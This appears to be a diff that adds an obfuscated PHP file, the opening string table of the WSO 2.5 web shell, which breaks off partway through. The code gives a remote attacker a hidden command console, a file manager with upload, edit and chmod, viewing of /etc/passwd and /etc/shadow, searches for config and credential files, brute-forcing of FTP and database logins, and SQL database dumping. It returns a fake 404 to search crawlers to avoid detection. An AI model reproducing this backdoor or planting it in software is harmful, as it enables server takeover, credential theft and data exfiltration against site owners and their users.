@@ -1,0 +1,1471 @@
+<?php
+error_reporting(0);
+define('ям', 'Ш');
+$GLOBALS[ям] = array(0 => "iconv", 1 => "libiconv", 2 => "mb_convert_encoding", 3 => "#df5", 4 => "FilesMan", 5 => "Windows-1251", 6 => "HTTP_USER_AGENT", 7 => "Google", 8 => "Slurp", 9 => "MSNBot", 10 => "ia_archiver", 11 => "Yandex", 12 => "Rambler", 13 => "/", 14 => "|", 15 => "/i", 16 => "HTTP/1.0 404 Not Found", 17 => "error_log", 18 => "log_errors", 19 => "max_execution_time", 20 => "WSO_VERSION", 21 => "2.5", 22 => "get_magic_quotes_gpc", 23 => "WSOstripslashes", 24 => "win", 25 => "win", 26 => "nix", 27 => "safe_mode", 28 => "disable_functions", 29 => "c", 30 => "\\", 31 => "/", 32 => "HTTP_HOST", 33 => "ajax", 34 => "List Directory", 35 => "dir", 36 => "Find index.php in current dir", 37 => "dir /s /w /b index.php", 38 => "Find *config*.php in current dir", 39 => "dir /s /w /b *config*.php", 40 => "Show active connections", 41 => "netstat -an", 42 => "Show running services", 43 => "net start", 44 => "User accounts", 45 => "net user", 46 => "Show computers", 47 => "net view", 48 => "ARP Table", 49 => "arp -a", 50 => "IP Configuration", 51 => "ipconfig /all", 52 => "List dir", 53 => "ls -lha", 54 => "list file attributes on a Linux second extended file system", 55 => "lsattr -va", 56 => "show opened ports", 57 => "netstat -an | grep -i listen", 58 => "process status", 59 => "ps aux", 60 => "Find", 61 => "", 62 => "find all suid files", 63 => "find / -type f -perm -04000 -ls", 64 => "find suid files in current dir", 65 => "find . -type f -perm -04000 -ls", 66 => "find all sgid files", 67 => "find / -type f -perm -02000 -ls", 68 => "find sgid files in current dir", 69 => "find . -type f -perm -02000 -ls", 70 => "find config.inc.php files", 71 => "find / -type f -name config.inc.php", 72 => "find config* files", 73 => "find / -type f -name \"config*\"", 74 => "find config* files in current dir", 75 => "find . -type f -name \"config*\"", 76 => "find all writable folders and files", 77 => "find / -perm -2 -ls", 78 => "find all writable folders and files in current dir", 79 => "find . -perm -2 -ls", 80 => "find all service.pwd files", 81 => "find / -type f -name service.pwd", 82 => "find service.pwd files in current dir", 83 => "find . -type f -name service.pwd", 84 => "find all .htpasswd files", 85 => "find / -type f -name .htpasswd", 86 => "find .htpasswd files in current dir", 87 => "find . -type f -name .htpasswd", 88 => "find all .bash_history files", 89 => "find / -type f -name .bash_history", 90 => "find .bash_history files in current dir", 91 => "find . -type f -name .bash_history", 92 => "find all .fetchmailrc files", 93 => "find / -type f -name .fetchmailrc", 94 => "find .fetchmailrc files in current dir", 95 => "find . -type f -name .fetchmailrc", 96 => "Locate", 97 => "locate httpd.conf files", 98 => "locate httpd.conf", 99 => "locate vhosts.conf files", 100 => "locate vhosts.conf", 101 => "locate proftpd.conf files", 102 => "locate proftpd.conf", 103 => "locate psybnc.conf files", 104 => "locate psybnc.conf", 105 => "locate my.conf files", 106 => "locate my.conf", 107 => "locate admin.php files", 108 => "locate admin.php", 109 => "locate cfg.php files", 110 => "locate cfg.php", 111 => "locate conf.php files", 112 => "locate conf.php", 113 => "locate config.dat files", 114 => "locate config.dat", 115 => "locate config.php files", 116 => "locate config.php", 117 => "locate config.inc files", 118 => "locate config.inc", 119 => "locate config.inc.php", 120 => "locate config.default.php files", 121 => "locate config.default.php", 122 => "locate config* files ", 123 => "locate config", 124 => "locate .conf files", 125 => "locate '.conf'", 126 => "locate .pwd files", 127 => "locate '.pwd'", 128 => "locate .sql files", 129 => "locate '.sql'", 130 => "locate .htpasswd files", 131 => "locate '.htpasswd'", 132 => "locate .bash_history files", 133 => "locate '.bash_history'", 134 => "locate .mysql_history files", 135 => "locate '.mysql_history'", 136 => "locate .fetchmailrc files", 137 => "locate '.fetchmailrc'", 138 => "locate backup files", 139 => "locate backup", 140 => "locate dump files", 141 => "locate dump", 142 => "locate priv files", 143 => "locate priv", 144 => "charset", 145 => "default_charset", 146 => "<html><head><meta http-equiv='Content-Type' content='text/html; charset=", 147 => "'><title>", 148 => "cwd", 149 => "';\n    var a_ = '", 150 => "a", 151 => "'\n    var charset_ = '", 152 => "';\n    var p1_ = '", 153 => "p1", 154 => "\n", 155 => "", 156 => "';\n    var p2_ = '", 157 => "p2", 158 => "';\n    var p3_ = '", 159 => "p3", 160 => "';\n    var d = document;\n\tfunction set(a,c,p1,p2,p3,charset) {\n\t\tif(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;\n\t\tif(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;\n\t\tif(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;\n\t\tif(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;\n\t\tif(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;\n\t\tif(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;\n\t\t//if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;\n\t}\n\tfunction g(a,c,p1,p2,p3,charset) {\n\t\tset(a,c,p1,p2,p3,charset);\n\t\td.mf.submit();\n\t}\n\tfunction a(a,c,p1,p2,p3,charset) {\n\t\tset(a,c,p1,p2,p3,charset);\n\t\tvar params = 'ajax=true';\n\t\tfor(i=0;i<d.mf.elements.length;i++)\n\t\t\tparams += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);\n\t\tsr('", 161 => "REQUEST_URI", 162 => "', params);\n\t}\n\tfunction sr(url, params) {\n\t\tif (window.XMLHttpRequest)\n\t\t\treq = new XMLHttpRequest();\n\t\telse if (window.ActiveXObject)\n\t\t\treq = new ActiveXObject('Microsoft.XMLHTTP');\n        if (req) {\n            req.onreadystatechange = processReqChange;\n            req.open('POST', url, true);\n            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');\n            req.send(params);\n        }\n\t}\n\tfunction processReqChange() {\n\t\tif( (req.readyState == 4) )\n\t\t\tif(req.status == 200) {\n\t\t\t\tvar reg = new RegExp(\"(\\\\d+)([\\\\S\\\\s]*)\", 'm');\n\t\t\t\tvar arr=reg.exec(req.responseText);\n\t\t\t\teval(arr[2].substr(0, arr[1]));\n\t\t\t} else alert('Request error!');\n\t}\n</script>\n<head><body><div style='position:absolute;width:100%;background-color:#444;top:0;left:0;'>\n<form method=post name=mf style='display:none;'>\n<input type=hidden name=a>\n<input type=hidden name=c>\n<input type=hidden name=p1>\n<input type=hidden name=p2>\n<input type=hidden name=p3>\n<input type=hidden name=charset>\n</form>", 163 => "r", 164 => "s", 165 => "posix_getegid", 166 => "?", 167 => "name", 168 => "uid", 169 => "gid", 170 => "<a href='#' onclick='g(\"FilesMan\",\"", 171 => "\")'>", 172 => "/</a>", 173 => "UTF-8", 174 => "KOI8-R", 175 => "KOI8-U", 176 => "cp866", 177 => "<option value=\"", 178 => "\" ", 179 => "selected", 180 => ">", 181 => "</option>", 182 => "Sec. Info", 183 => "SecInfo", 184 => "Files", 185 => "Console", 186 => "Sql", 187 => "UPdate/UPgrade", 188 => "UPDate", 189 => "Php", 190 => "String tools", 191 => "StringTools", 192 => "Bruteforce", 193 => "Network", 194 => "auth_pass", 195 => "Logout", 196 => "Self remove", 197 => "SelfRemove", 198 => "<th width=\"", 199 => "%\">[ <a href=\"#\" onclick=\"g('", 200 => "',null,'','','')\"><font color=\"#25ff00\">", 201 => "</font></a> ]</th>", 202 => "',null,'','','')\">", 203 => "</a> ]</th>", 204 => "os", 205 => "z", 206 => ":\\", 207 => "<a href=\"#\" onclick=\"g('FilesMan','", 208 => ":/')\">[ ", 209 => " ]</a> ", 210 => "<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:", 211 => "<br>Drives:", 212 => "</span></td>", 213 => "<td><nobr>", 214 => "</nobr><br>", 215 => " ( ", 216 => " ) <span>Group:</span> ", 217 => " )<br>", 218 => " <span>Safe mode:</span> ", 219 => "<font color=red>ON</font>", 220 => "<font color=green><b>OFF</b></font>", 221 => " <a href=# onclick=\"g('Php',null,'','info')\">[ phpinfo ]</a> <span>Datetime:</span> ", 222 => "Y-m-d H:i:s", 223 => "<br>", 224 => " <span>Free:</span> ", 225 => " (", 226 => "%)<br>", 227 => " ", 228 => " <a href=# onclick=\"g('FilesMan','", 229 => "home_cwd", 230 => "','','','')\">[ home ]</a><br>", 231 => "</td>", 232 => "<td width=1 align=right><nobr><select onchange=\"g(null,null,null,null,null,this.value)\"><optgroup label=\"Page charset\">", 233 => "</optgroup></select><br><span>Server IP:</span><br>", 234 => "SERVER_ADDR", 235 => "<br><span>Client IP:</span><br>", 236 => "REMOTE_ADDR", 237 => "</nobr></td></tr></table>", 238 => "<table style=\"border-top:2px solid #333;\" cellpadding=3 cellspacing=0 width=100%><tr>", 239 => "</tr></table><div style=\"margin:5\">", 240 => " <font color='green'>(Writeable)</font>", 241 => " <font color=red>(Not writable)</font>", 242 => "\n</div>\n<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #333;'>\n\t<tr>\n\t\t<td><form onsubmit='g(null,this.c.value,\"\");return false;'><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='", 243 => "'>\n\t\t<input type=hidden name=p1 value='uploadFile'>\n\t\t<input type=hidden name=charset value='", 244 => "posix_getpwuid", 245 => "posix_getpwuid", 246 => "posix_getgrgid", 247 => "posix_getgrgid", 248 => "exec", 249 => "passthru", 250 => "system", 251 => "shell_exec", 252 => "r", 253 => "%u", 254 => "%1.2f", 255 => " GB", 256 => " MB", 257 => " KB", 258 => " B", 259 => "l", 260 => "-", 261 => "b", 262 => "d", 263 => "p", 264 => "u", 265 => "w", 266 => "x", 267 => "S", 268 => "t", 269 => "T", 270 => "<font color=#FF0000>", 271 => "</font>", 272 => "<font color=white>", 273 => "<font color=#25ff00>", 274 => "scandir", 275 => "which ", 276 => "<h1>Server security information</h1><div class=content>", 277 => "<span>", 278 => ": </span>", 279 => "<pre class=ml1>", 280 => "</pre>", 281 => "Server software", 282 => "SERVER_SOFTWARE", 283 => "apache_get_modules", 284 => "Loaded Apache modules", 285 => ", ", 286 => "Disabled PHP Functions", 287 => "none", 288 => "Open base dir", 289 => "open_basedir", 290 => "Safe mode exec dir", 291 => "safe_mode_exec_dir", 292 => "Safe mode include dir", 293 => "safe_mode_include_dir", 294 => "cURL support", 295 => "curl_version", 296 => "enabled", 297 => "no", 298 => "mysql_get_client_info", 299 => "MySql (", 300 => ")", 301 => "mssql_connect", 302 => "MSSQL", 303 => "pg_connect", 304 => "PostgreSQL", 305 => "oci_connect", 306 => "Oracle", 307 => "Supported databases", 308 => "Readable /etc/passwd", 309 => "/etc/passwd", 310 => "yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>", 311 => "Readable /etc/shadow", 312 => "/etc/shadow", 313 => "yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"shadow\")'>[view]</a>", 314 => "OS version", 315 => "/proc/version", 316 => "Distr name", 317 => "/etc/issue.net", 318 => "gcc", 319 => "lcc", 320 => "cc", 321 => "ld", 322 => "make", 323 => "php", 324 => "perl", 325 => "python", 326 => "ruby", 327 => "tar", 328 => "gzip", 329 => "bzip", 330 => "bzip2", 331 => "nc", 332 => "locate", 333 => "suidperl", 334 => "kav", 335 => "nod32", 336 => "bdcored", 337 => "uvscan", 338 => "sav", 339 => "drwebd", 340 => "clamd", 341 => "rkhunter", 342 => "chkrootkit", 343 => "iptables", 344 => "ipfw", 345 => "tripwire", 346 => "shieldcc", 347 => "portsentry", 348 => "snort", 349 => "ossec", 350 => "lidsadm", 351 => "tcplodg", 352 => "sxid", 353 => "logcheck", 354 => "logwatch", 355 => "sysmask", 356 => "zmbscap", 357 => "sawmill", 358 => "wormscan", 359 => "ninja", 360 => "wget", 361 => "fetch", 362 => "lynx", 363 => "links", 364 => "curl", 365 => "get", 366 => "lwp-mirror", 367 => "Userful", 368 => "Danger", 369 => "Downloaders", 370 => "<br/>", 371 => "HDD space", 372 => "df -h", 373 => "Hosts", 374 => "/etc/hosts", 375 => "<br/><span>posix_getpwuid (\"Read\" /etc/passwd)</span><table><form onsubmit='g(null,null,\"5\",this.param1.value,this.param2.value);return false;'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value=\">>\"></form>", 376 => ":", 377 => "Users", 378 => "OS Version", 379 => "ver", 380 => "Account Settings", 381 => "net accounts", 382 => "User Accounts", 383 => "net user", 384 => "</div>", 385 => "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='", 386 => "\n\r\t\\'\x00", 387 => "';\n", 388 => "info", 389 => "<h1>PHP info</h1><div class=content><style>.p {color:#000;}</style>", 390 => "!(body|a:\\w+|body, td, th, h1, h2) {.*}!msiU", 391 => "!td, th {(.*)}!msiU", 392 => "!<img[^>]+>!msiU", 393 => ".e, .v, .h, .h th {\$1}", 394 => "<h1", 395 => "<h2", 396 => "</div><br>", 397 => "<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit=\"if(this.ajax.checked){a('Php',null,this.code.value);}else{g('Php',null,this.code.value,'');}return false;\"><textarea name=code class=bigarea id=PhpCode>", 398 => "</textarea><input type=submit value=Eval style=\"margin-top:5px\">", 399 => " <input type=checkbox name=ajax value=1 ", 400 => "checked", 401 => "> send using AJAX</form><pre id=PhpOutput style=\"", 402 => "display:none;", 403 => "margin-top:5px;\" class=ml1>", 404 => "</pre></div>", 405 => "f", 406 => "uploadFile", 407 => "tmp_name", 408 => "Can't upload file!", 409 => "mkdir", 410 => "Can't create new dir", 411 => "delete", 412 => "..", 413 => ".", 414 => "..", 415 => "paste", 416 => "act", 417 => "copy", 418 => "move", 419 => "zip", 420 => "ZipArchive", 421 => "unzip", 422 => "escapeshellarg", 423 => "tar cfzv ", 424 => "<h1>File manager</h1><div class=content><script>p1_=p2_=p3_=\"\";</script>", 425 => "Can't open this folder!", 426 => "!s_([A-z]+)_(\\d{1})!", 427 => "<script>\n\tfunction sa() {\n\t\tfor(i=0;i<d.files.elements.length;i++)\n\t\t\tif(d.files.elements[i].type == 'checkbox')\n\t\t\t\td.files.elements[i].checked = d.files.elements[0].checked;\n\t}\n</script>\n<table width='100%' class='main' cellspacing='0' cellpadding='2'>\n<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_", 428 => "\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_", 429 => "\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_", 430 => "\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_", 431 => "\")'>Permissions</a></th><th>Actions</th></tr>", 432 => "path", 433 => "modify", 434 => "perms", 435 => "size", 436 => "owner", 437 => "group", 438 => "type", 439 => "file", 440 => "link", 441 => "dir", 442 => "sort", 443 => "wsoCmp", 444 => "<tr", 445 => " class=l1", 446 => "><td><input type=checkbox name=\"f[]\" value=\"", 447 => "\" class=chkbx></td><td><a href=# onclick=\"", 448 => "g('FilesTools',null,'", 449 => "', 'view')\">", 450 => "g('FilesMan','", 451 => "');\" ", 452 => "><b>[ ", 453 => " ]</b>", 454 => "</a></td><td>", 455 => "</td><td>", 456 => "</td><td><a href=# onclick=\"g('FilesTools',null,'", 457 => "','chmod')\">", 458 => "</td><td><a href=\"#\" onclick=\"g('FilesTools',null,'", 459 => "', 'rename')\">R</a> <a href=\"#\" onclick=\"g('FilesTools',null,'", 460 => "', 'touch')\">T</a>", 461 => " <a href=\"#\" onclick=\"g('FilesTools',null,'", 462 => "', 'edit')\">E</a> <a href=\"#\" onclick=\"g('FilesTools',null,'", 463 => "', 'download')\">D</a>", 464 => "</td></tr>", 465 => "<tr><td colspan=7>\n\t<input type=hidden name=a value='FilesMan'>\n\t<input type=hidden name=c value='", 466 => "'>\n\t<input type=hidden name=charset value='", 467 => "'>\n\t<select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option>", 468 => "<option value='zip'>Compress (zip)</option><option value='unzip'>Uncompress (zip)</option>", 469 => "<option value='tar'>Compress (tar.gz)</option>", 470 => "<option value='paste'>Paste / Compress</option>", 471 => "</select>&nbsp;", 472 => "file name: <input type=text name=p2 value='wso_", 473 => "Ymd_His", 474 => "tar.gz", 475 => "'>&nbsp;", 476 => "<input type='submit' value='>>'></td></tr></form></table></div>", 477 => "hex2bin", 478 => "binhex", 479 => "hex2ascii", 480 => "ascii2hex", 481 => "%02X", 482 => "full_urlencode", 483 => "%", 484 => "Base64 encode", 485 => "base64_encode", 486 => "Base64 decode", 487 => "base64_decode", 488 => "Url encode", 489 => "urlencode", 490 => "Url decode", 491 => "urldecode", 492 => "Full urlencode", 493 => "md5 hash", 494 => "md5", 495 => "sha1 hash", 496 => "sha1", 497 => "crypt", 498 => "CRC32", 499 => "crc32", 500 => "ASCII to HEX", 501 => "HEX to ASCII", 502 => "HEX to DEC", 503 => "hexdec", 504 => "HEX to BIN", 505 => "DEC to HEX", 506 => "dechex", 507 => "DEC to BIN", 508 => "decbin", 509 => "BIN to HEX", 510 => "BIN to DEC", 511 => "bindec", 512 => "String to lower case", 513 => "strtolower", 514 => "String to upper case", 515 => "strtoupper", 516 => "Htmlspecialchars", 517 => "htmlspecialchars", 518 => "String length", 519 => "strlen", 520 => "document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='", 521 => "<h1>String conversions</h1><div class=content>", 522 => "<form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;'><select name='selectTool'>", 523 => "<option value='", 524 => "'>", 525 => "</option>", 526 => "</select><input type='submit' value='>>'/> <input type=checkbox name=ajax value=1 ", 527 => "> send using AJAX<br><textarea name='input' style='margin-top:5px' class=bigarea>", 528 => "</textarea></form><pre class='ml1' style='", 529 => "margin-top:5px' id='strOutput'>", 530 => "</pre></div><br><h1>Search files:</h1><div class=content>\n\t\t<form onsubmit=\"g(null,this.cwd.value,null,this.text.value,this.filename.value);return false;\"><table cellpadding='1' cellspacing='0' width='50%'>\n\t\t\t<tr><td width='1%'>Text:</td><td><input type='text' name='text' style='width:100%'></td></tr>\n\t\t\t<tr><td>Path:</td><td><input type='text' name='cwd' value='", 531 => "' style='width:100%'></td></tr>\n\t\t\t<tr><td>Name:</td><td><input type='text' name='filename' value='*' style='width:100%'></td></tr>\n\t\t\t<tr><td></td><td><input type='submit' value='>>'></td></tr>\n\t\t\t</table></form>", 532 => "*", 533 => "<a href='#' onclick='g(\"FilesTools\",null,\"", 534 => "\", \"view\",\"\")'>", 535 => "</a><br>", 536 => "</div><br><h1>Search for hash:</h1><div class=content>\n\t\t<form method='post' target='_blank' name='hf'>\n\t\t\t<input type='text' name='hash' style='width:200px;'><br>\n            <input type='hidden' name='act' value='find'/>\n\t\t\t<input type='button' value='hashcracking.ru' onclick=\"document.hf.action='https://hashcracking.ru/index.php';document.hf.submit()\"><br>\n\t\t\t<input type='button' value='md5.rednoize.com' onclick=\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()\"><br>\n            <input type='button' value='crackfor.me' onclick=\"document.hf.action='http://crackfor.me/index.php';document.hf.submit()\"><br>\n\t\t</form></div>", 537 => "download", 538 => "ob_gzhandler", 539 => "Content-Disposition: attachment; filename=", 540 => "mime_content_type", 541 => "Content-Type: ", 542 => "Content-Type: application/octet-stream", 543 => "mkfile", 544 => "edit", 545 => "<h1>File tools</h1><div class=content>", 546 => "File not exists", 547 => "<span>Name:</span> ", 548 => " <span>Size:</span> ", 549 => " <span>Permission:</span> ", 550 => " <span>Owner/Group:</span> ", 551 => "<span>Change time:</span> ", 552 => " <span>Access time:</span> ", 553 => " <span>Modify time:</span> ", 554 => "<br><br>", 555 => "view", 556 => "View", 557 => "Highlight", 558 => "Download", 559 => "Hexdump", 560 => "Edit", 561 => "Chmod", 562 => "Rename", 563 => "Touch", 564 => "<a href=# onclick=\"g(null,null,'", 565 => "','", 566 => "')\">", 567 => "<b>[ ", 568 => "</a> ", 569 => "highlight", 570 => "<div class=ml1 style=\"background-color: #e1e1e1;color:black;\">", 571 => "<span ", 572 => "</span>", 573 => "<font ", 574 => "chmod", 575 => "Can't set permissions!<br><script>document.mf.p3.value=\"\";</script>", 576 => "<script>p3_=\"\";</script><form onsubmit=\"g(null,null,'", 577 => "',null,this.chmod.value);return false;\"><input type=text name=chmod value=\"", 578 => "%o", 579 => "\"><input type=submit value=\">>\"></form>", 580 => "edit", 581 => "File isn't writeable", 582 => "w", 583 => "Saved!<br><script>p3_=\"\";</script>", 584 => "<form onsubmit=\"g(null,null,'", 585 => "',null,'1'+this.text.value);return false;\"><textarea name=text class=bigarea>", 586 => "</textarea><input type=submit value=\">>\"></form>", 587 => "hexdump", 588 => "00000000<br>", 589 => "%08X", 590 => "<table cellspacing=1 cellpadding=5 bgcolor=#222222><tr><td bgcolor=#333333><span style=\"font-weight: normal;\"><pre>", 591 => "</pre></span></td><td bgcolor=#282828><pre>", 592 => "</pre></td><td bgcolor=#333333><pre>", 593 => "</pre></td></tr></table>", 594 => "rename", 595 => "Can't rename!<br>", 596 => "<script>g(null,null,\"", 597 => "\",null,\"\")</script>", 598 => "',null,this.name.value);return false;\"><input type=text name=name value=\"", 599 => "touch", 600 => "Fail!", 601 => "Touched!", 602 => "Bad time format!", 603 => "',null,this.touch.value);return false;\"><input type=text name=touch value=\"", 604 => "Y-m-d H:i:s", 605 => "stderr_to_out", 606 => " 2>&1", 607 => "d.cf.cmd.value='';\n", 608 => "\n\$ ", 609 => "!.*cd\\s+([^;]+)\$!", 610 => "c_='", 611 => "';", 612 => "d.cf.output.value+='", 613 => "d.cf.output.scrollTop = d.cf.output.scrollHeight;", 614 => "<script>\nif(window.Event) window.captureEvents(Event.KEYDOWN);\nvar cmds = new Array('');\nvar cur = 0;\nfunction kp(e) {\n\tvar n = (window.Event) ? e.which : e.keyCode;\n\tif(n == 38) {\n\t\tcur--;\n\t\tif(cur>=0)\n\t\t\tdocument.cf.cmd.value = cmds[cur];\n\t\telse\n\t\t\tcur++;\n\t} else if(n == 40) {\n\t\tcur++;\n\t\tif(cur < cmds.length)\n\t\t\tdocument.cf.cmd.value = cmds[cur];\n\t\telse\n\t\t\tcur--;\n\t}\n}\nfunction add(cmd) {\n\tcmds.pop();\n\tcmds.push(cmd);\n\tcmds.push('');\n\tcur = cmds.length-1;\n}\n</script>", 615 => "<h1>Console</h1><div class=content><form name=cf onsubmit=\"if(d.cf.cmd.value=='clear'){d.cf.output.value='';d.cf.cmd.value='';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value,this.show_errors.checked?1:'');}else{g(null,null,this.cmd.value,this.show_errors.checked?1:'');} return false;\"><select name=alias>", 616 => "aliases", 617 => "<optgroup label=\"-", 618 => "-\"></optgroup>", 619 => "\">", 620 => "</select><input type=button onclick=\"add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:'');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:'');}\" value=\">>\"> <nobr><input type=checkbox name=ajax value=1 ", 621 => "> send using AJAX <input type=checkbox name=show_errors value=1 ", 622 => "> redirect stderr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style=\"border-bottom:0;margin:0;\" readonly>", 623 => "\$ ", 624 => "</textarea><table style=\"border:1px solid #df5;background-color:#555;border-top:0px;\" cellpadding=0 cellspacing=0 width=\"100%\"><tr><td width=\"1%\">\$</td><td><input type=text name=cmd style=\"border:0px;width:100%;\" onkeydown=\"kp(event);\"></td></tr></table>", 625 => "</form></div><script>d.cf.cmd.focus();</script>", 626 => "bye!", 627 => "/\\.php/", 628 => "#(.*)\\.php#", 629 => ".php", 630 => "/\\.php5/", 631 => "#(.*)\\.php5#", 632 => ".php5", 633 => "/\\.php7/", 634 => "#(.*)\\.php7#", 635 => ".php7", 636 => "/\\.phtml/", 637 => "#(.*)\\.phtml#", 638 => ".phtml", 639 => "yes", 640 => "!\\(\\d+\\)\\s.*!", 641 => "Shell has been removed", 642 => "unlink error!", 643 => "<h1>Suicide</h1><div class=content>Really want to remove the shell?<br><a href=# onclick=\"g(null,null,'yes')\">Yes</a></div>", 644 => "proto", 645 => "<h1>Results</h1><div class=content><span>Type:</span> ", 646 => " <span>Server:</span> ", 647 => "server", 648 => "ftp", 649 => "mysql", 650 => "pgsql", 651 => "host='", 652 => "' port='", 653 => "' user='", 654 => "' password='", 655 => "' dbname=postgres", 656 => ":", 657 => "<b>", 658 => "</b>:", 659 => "reverse", 660 => "dict", 661 => "login", 662 => "<h1>Bruteforce</h1><div class=content><table><form method=post><tr><td><span>Type</span></td>", 663 => "<td><select name=proto><option value=ftp>FTP</option><option value=mysql>MySql</option><option value=pgsql>PostgreSql</option></select></td></tr><tr><td>", 664 => "<input type=hidden name=c value=\"", 665 => "<input type=hidden name=a value=\"", 666 => "<input type=hidden name=charset value=\"", 667 => "<span>Server:port</span></td>", 668 => "<td><input type=text name=server value=\"127.0.0.1\"></td></tr>", 669 => "<tr><td><span>Brute type</span></td>", 670 => "<td><label><input type=radio name=type value=\"1\" checked> /etc/passwd</label></td></tr>", 671 => "<tr><td></td><td><label style=\"padding-left:15px\"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol)</label></td></tr>", 672 => "<tr><td></td><td><label><input type=radio name=type value=\"2\"> Dictionary</label></td></tr>", 673 => "<tr><td></td><td><table style=\"padding-left:15px\"><tr><td><span>Login</span></td>", 674 => "<td><input type=text name=login value=\"root\"></td></tr>", 675 => "<tr><td><span>Dictionary</span></td>", 676 => "<td><input type=text name=dict value=\"", 677 => "passwd.dic\"></td></tr></table>", 678 => "</td></tr><tr><td></td><td><input type=submit value=\">>\"></td></tr></form></table>", 679 => "SHOW databases", 680 => "SELECT datname FROM pg_database WHERE datistemplate!='t'", 681 => "SHOW TABLES", 682 => "select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'", 683 => "mysql_set_charset", 684 => "SET CHARSET ", 685 => "SELECT LOAD_FILE('", 686 => "') as file", 687 => "CREATE TABLE wso2(file text);COPY wso2 FROM '", 688 => "';select file from wso2;", 689 => "drop table wso2", 690 => "SHOW CREATE TABLE `", 691 => "`", 692 => ";\n", 693 => "SELECT * FROM `", 694 => ";\n\n", 695 => "NULL", 696 => "'", 697 => "`", 698 => "INSERT INTO `", 699 => "` (", 700 => ", ", 701 => ") VALUES \n\t(", 702 => ")", 703 => "\n\t,(", 704 => "SELECT * FROM ", 705 => "INSERT INTO ", 706 => ") VALUES (", 707 => ");", 708 => "select", 709 => "sql_host", 710 => "sql_login", 711 => "sql_pass", 712 => "sql_base", 713 => "Windows-1251", 714 => "cp1251", 715 => "UTF-8", 716 => "utf8", 717 => "KOI8-R", 718 => "koi8r", 719 => "KOI8-U", 720 => "koi8u", 721 => "cp866", 722 => "Content-Disposition: attachment; filename=dump.sql", 723 => "Content-Type: text/plain", 724 => "tbl", 725 => "<script>alert(\"Error! Can't open file\");window.history.back(-1)</script>", 726 => "\n<h1>Sql browser</h1><div class=content>\n<form name='sf' method='post' onsubmit='fs(this);'><table cellpadding='2' cellspacing='0'><tr>\n<td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td><td></td></tr><tr>\n<input type=hidden name=a value=Sql><input type=hidden name=p1 value='query'><input type=hidden name=p2 value=''><input type=hidden name=c value='", 727 => "'><input type=hidden name=charset value='", 728 => "'>\n<td><select name='type'><option value='mysql' ", 729 => ">MySql</option><option value='pgsql' ", 730 => ">PostgreSql</option></select></td>\n<td><input type=text name=sql_host value=\"", 731 => "localhost", 732 => "\"></td>\n<td><input type=text name=sql_login value=\"", 733 => "root", 734 => "\"></td>\n<td><input type=text name=sql_pass value=\"", 735 => "\"></td><td>", 736 => "<input type=text name=sql_base value=''>", 737 => "<select name=sql_base><option value=''></option>", 738 => "</select>", 739 => "</td>\n\t\t\t\t<td><input type=submit value='>>' onclick='fs(d.sf);'></td>\n                <td><input type=checkbox name=sql_count value='on'", 740 => "sql_count", 741 => " checked", 742 => "> count the number of rows</td>\n\t\t\t</tr>\n\t\t</table>\n\t\t<script>\n            s_db='", 743 => "';\n            function fs(f) {\n                if(f.sql_base.value!=s_db) { f.onsubmit = function() {};\n                    if(f.p1) f.p1.value='';\n                    if(f.p2) f.p2.value='';\n                    if(f.p3) f.p3.value='';\n                }\n            }\n\t\t\tfunction st(t,l) {\n\t\t\t\td.sf.p1.value = 'select';\n\t\t\t\td.sf.p2.value = t;\n                if(l && d.sf.p3) d.sf.p3.value = l;\n\t\t\t\td.sf.submit();\n\t\t\t}\n\t\t\tfunction is() {\n\t\t\t\tfor(i=0;i<d.sf.elements['tbl[]'].length;++i)\n\t\t\t\t\td.sf.elements['tbl[]'][i].checked = !d.sf.elements['tbl[]'][i].checked;\n\t\t\t}\n\t\t</script>", 744 => "<br/><table width=100% cellpadding=2 cellspacing=0>", 745 => "<tr><td width=1 style='border-top:2px solid #666;'><span>Tables:</span><br><br>", 746 => "SELECT COUNT(*) as n FROM ", 747 => "<nobr><input type='checkbox' name='tbl[]' value='", 748 => "'>&nbsp;<a href=# onclick=\"st('", 749 => "',1)\">", 750 => "</a>", 751 => "&nbsp;", 752 => "n", 753 => "</nobr><br>", 754 => "<input type='checkbox' onclick='is();'> <input type=button value='Dump' 